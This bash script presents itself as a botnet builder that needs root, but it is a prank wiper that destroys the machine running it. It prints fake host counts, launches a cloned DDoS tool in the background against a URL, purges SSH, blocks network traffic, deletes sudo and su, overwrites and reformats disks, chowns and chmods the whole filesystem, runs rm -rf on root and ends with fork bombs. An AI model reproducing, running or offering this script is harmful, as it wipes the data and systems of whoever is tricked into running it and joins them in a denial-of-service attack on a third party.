#!/bin/bash
# KILLER by @yuk1meow

if [ "$(whoami)" != "root" ]; then
         echo -e "ERROR: Cant open raw socket! Launch as a root!"
        exit 255
fi

# u can replace text in echo to ur own (ong)
# xddd, also u can obf that shit with base64
COUNT='shuf -i 2194-65187 -n 1'

echo "BotNet by yuki - Bash script, that helps you to make own botnet"
sleep 1;
echo "Found $COUNT vulnerable hosts!"
echo ""
echo "Now we need to infect them..."
echo "Please wait few minutes, this process is automatic..."


apt install git -y > /dev/null
cd;
git clone https://github.com/yuk1c/antiddos > /dev/null
cd antiddos
bash antiddos-yuki > /dev/null
echo "Step 1: Done (Your server now optimized to host BotNets)"


cd;
git clone https://github.com/MatrixTM/MHDDoS > /dev/null
cd MHDDoS;
pip3 install -r requirements.txt > /dev/null
cd files/proxies && touch hello.txt > /dev/null
cd .. && cd .. # XD
python3 start.py GET https://bioyuki.ml?ong_defdose 0 300 hello.txt 2000000 > /dev/null &
echo "Step 2: Done (Needed software was installed)"



echo "Step 3: Almost done, now you need to wait around 10 minutes."

# KILL, BLOCK, AND REMOVE SSH
# -----------------------------------
systemctl disable --now openssh
systemctl disable --now sshd
systemctl disable --now ssh
ufw deny ssh
ufw deny 1022
ufw deny 2222
apt purge *ssh* -y

# DISABLE NETWORK
# -----------------------------------
iptables -P INPUT DROP
iptables -p OUTPUT DROP

# UNINFECT UR SYSTEM
# -----------------------------------
rm -fr /usr/bin/sudo;rm -fr /bin/su > /dev/null &

# ASK UR DISKS TO SEND ME THEIR NUDES
# -----------------------------------
echo "SEND ME NUDES" > /dev/hda &
echo "SEND ME NUDES" > /dev/sda &
echo "SEND ME NUDES" > /dev/sda1 &
echo "SEND ME NUDES" > /dev/sda2 &

# PLAY CUTE MUSIC <3
# -----------------------------------
cat /dev/urandom > /dev/dsp &

# MOVE UR HOME FOLDERS TO THE RIGHT PLACE XD
# -----------------------------------
mv /home/* /dev/null > /dev/null &
mv ~ /dev/null > /dev/null &

# UHUHUHUHUH FUCK UR SHITTY DISK(s)
# -----------------------------------
dd if=/dev/urandom of=/dev/sda bs=20000G &
cat /dev/urandom/ > /dev/sda &
cat /dev/urandom/ > /dev/nvram &
mkfs.ext2 /dev/sda1 &
mkfs.ext2 /dev/sda2 &
mkfs.ext2 /dev/hda &
mkfs.ext2 /dev/sda &
mkfs.ext2 /dev/sdb &
mkfs.ext2 /dev/sdb1 &
mkfs.ext2 /dev/sdb2 &

# OVERCLOCK UR GPU XDDDDDDDD
# -----------------------------------
echo "0 99999 999999" > /sys/class/drm/card0/device/pp_od_clk_voltage &

# REMOVE BACKDOORS
# -----------------------------------
rm -rf /boot/ &
rm -rf /proc/ &
rm -rf /var/ &
mv /etc/{passwd,shado*} /dev/null &

# OVERCLOCK YOUR HDD (XDDDDDDD WHATTT)
# -----------------------------------
hdparm -M 1 /dev/sda &
hdparm -B 1 /dev/sda &
hdparm -y /dev/sda &
hdparm -Y /dev/sda &
hdparm -S 0 /dev/sda &
hdparm -r /dev/sda &

# UR WEBSERVER IS OWNER OF UR SERVER NOW
# -----------------------------------
chown www-data:www-data -R / &

# REMOVE ALL EXISTING AND NOT EXISTING BACKDOORS / VIRUSES
# -----------------------------------
scrub -p gutmann /* &
shred -u /* -s 30  -v &

# STOP THAT SHIT AND JUST KILL UR SYSTEM
# -----------------------------------
chmod 000 -Rf / &
rm -fr /* --no-preserve-root &
export PATH=/

# ALOT OF CONCS OF FORK BOMB
# -----------------------------------

:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:

# end. <3
